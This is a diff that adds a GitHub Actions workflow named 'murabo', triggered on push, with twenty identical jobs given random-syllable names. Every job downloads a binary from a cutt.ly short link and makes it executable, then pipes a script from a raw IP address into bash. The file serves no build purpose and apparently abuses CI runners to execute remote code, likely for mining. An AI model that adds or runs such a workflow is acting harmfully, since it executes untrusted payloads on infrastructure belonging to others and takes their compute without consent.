@@ -1,0 +1,163 @@
+name: murabo
+on: push
+jobs:
+  mahejana:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  cosilaru:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  zasoyu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  sibejixu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  sojovu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  modova:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  biruvi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  gazato:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  domula:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  senixupu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  maseku:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  lasewa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  bemipe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  yejoko:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  yihideta:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  xagadu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  pijaci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  sukoyi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  soyolilu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
+  vepebo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://cutt.ly/URirSKE; chmod +x URirSKE
+    - name: Update
+      run: curl http://103.172.204.182/mandalorian/npysx.php?a=jipu | bash -
